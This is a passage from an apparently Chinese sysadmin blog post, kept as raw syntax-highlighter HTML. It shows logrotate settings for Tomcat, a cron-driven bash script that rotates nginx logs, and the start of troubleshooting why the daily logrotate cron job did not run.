class=\"crayon-v\">spooler</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170101</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-36\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spooler</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170108</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-37\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">37</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spooler</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170115</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0133 seconds] -->\r\n<p>———————————-tomcat日志切割一例———————————–</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45bad198511510\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu-backup ~]# cat /etc/logrotate.d/tomcat \r\n/Data/app/tomcat-7-huanqiu/logs/catalina.out { \r\nrotate 14 \r\ndaily \r\ncopytruncate \r\ncompress \r\nnotifempty \r\nmissingok \r\n} \r\n\r\n[root@huanqiu-backup ~]# ll /Data/app/tomcat-7-huanqiu/logs/catalina.*\r\n-rw-r--r--. 1 root root     0 Jan 19 19:11 /Data/app/tomcat-7-huanqiu/logs/catalina.out\r\n-rw-r--r--. 1 root root 95668 Jan 19 19:11 /Data/app/tomcat-7-huanqiu/logs/catalina.out.1.gz</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bad198511510-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bad198511510-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">backup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/logrotate.d/tomcat </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tomcat</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">huanqiu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">catalina</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-3\"><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-4\"><span class=\"crayon-e\">daily </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-5\"><span class=\"crayon-e\">copytruncate </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-6\"><span class=\"crayon-e\">compress </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-7\"><span class=\"crayon-e\">notifempty </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-8\"><span class=\"crayon-i\">missingok</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-9\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-11\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">backup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /Data/app/tomcat-7-huanqiu/logs/catalina.*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bad198511510-12\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tomcat</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">huanqiu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">catalina</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bad198511510-13\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">95668</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tomcat</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">huanqiu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">catalina</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1.gz</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>———————————早期用过的nginx日志处理一例———————————-</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45bb1358924224\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@letv-backup ~]# vim /letv/sh/cut_nginx_log.sh\r\n#!/bin/bash\r\n# 你的日志文件存放目录\r\nlogs_path=\"/letv/logs/\"\r\n# 日志文件的名字，多个需要空格隔开\r\nlogs_names=(error access pv_access)\r\ndates=`date -d \"yesterday\" +\"%Y%m%d\"`\r\nmkdir -p ${logs_path}$dates/\r\nnum=${#logs_names[@]}\r\nfor((i=0;i&lt;num;i++));do\r\nmv ${logs_path}${logs_names[i]}.log ${logs_path}$dates/${logs_names[i]}.log\r\ndone\r\n#nginx平滑重启\r\nkill -USR1 `cat /letv/logs/nginx/nginx.pid`           \r\n \r\n结合crontab定时执行\r\n[root@letv-backup ~]# crontab -e\r\n#nginx日志切割\r\n00 00 * * * cd /letv/logs;/bin/bash /letv/sh/cut_nginx_log.sh &gt; /dev/null 2&gt;$1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb1358924224-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb1358924224-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">letv</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">backup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># vim /letv/sh/cut_nginx_log.sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-2\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-3\"><span class=\"crayon-p\"># 你的日志文件存放目录</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-4\"><span class=\"crayon-v\">logs_path</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"/letv/logs/\"</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-5\"><span class=\"crayon-p\"># 日志文件的名字，多个需要空格隔开</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-6\"><span class=\"crayon-v\">logs_names</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">error </span><span class=\"crayon-e\">access </span><span class=\"crayon-v\">pv_access</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-7\"><span class=\"crayon-v\">dates</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">date</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"yesterday\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"%Y%m%d\"</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-8\"><span class=\"crayon-e\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">logs_path</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">dates</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-9\"><span class=\"crayon-v\">num</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-p\">#logs_names[@]}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-10\"><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">num</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-11\"><span class=\"crayon-e\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">logs_path</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">logs_names</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">logs_path</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">dates</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">logs_names</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-12\"><span class=\"crayon-v\">done</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-13\"><span class=\"crayon-p\">#nginx平滑重启</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-14\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">USR1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">letv</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\">           </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-15\"><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-16\">结合<span class=\"crayon-i\">crontab</span>定时执行</div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-17\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">letv</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">backup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># crontab -e</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45bb1358924224-18\"><span class=\"crayon-p\">#nginx日志切割</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45bb1358924224-19\"><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">letv</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-sy\">;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">letv</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cut_nginx_log</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p><strong>3）尝试解决logrotate无法自动轮询日志的办法</strong></p>\n<p>现象说明：</p>\n<p>使用logrotate轮询nginx日志，配置好之后，发现nginx日志连续两天没被切割，这是为什么呢？？</p>\n<p>然后开始检查日志切割的配置文件是否有问题，检查后确定配置文件一切正常。</p>\n<p>于是怀疑是logrotate预定的cron没执行，查看了cron的日志，发现有一条Dec 7 04:02:01 www crond[18959]: (root) CMD (run-parts /etc/cron.daily)这样的日志，证明cron在04:02分时已经执行/etc/cron.daily目录下的程序。</p>\n<p>接着查看/etc /cron.daily/logrotate（这是logrotate自动轮转的脚本）的内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45bb6401810161\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_test ~]# cat /etc/cron.daily/logrotate\r\n#!/bin/sh\r\n \r\n/usr/sbin/logrotate /etc/logrotate.conf &gt;/dev/null 2&gt;&amp;1\r\nEXITVALUE=$?\r\nif [ $EXITVALUE != 0 ]; then\r\n    /usr/bin/logger -t logrotate \"ALERT exited abnormally with [$EXITVALUE]\"\r\nfi\r\nexit 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb6401810161-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb6401810161-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb6401810161-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb6401810161-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb6401810161-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb6401810161-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb6401810161-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45bb6401810161-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45bb6401810161-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45bb6401810161-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/cron.daily/logrotate</span></div><div class=\"crayon-line crayon-striped-line\" 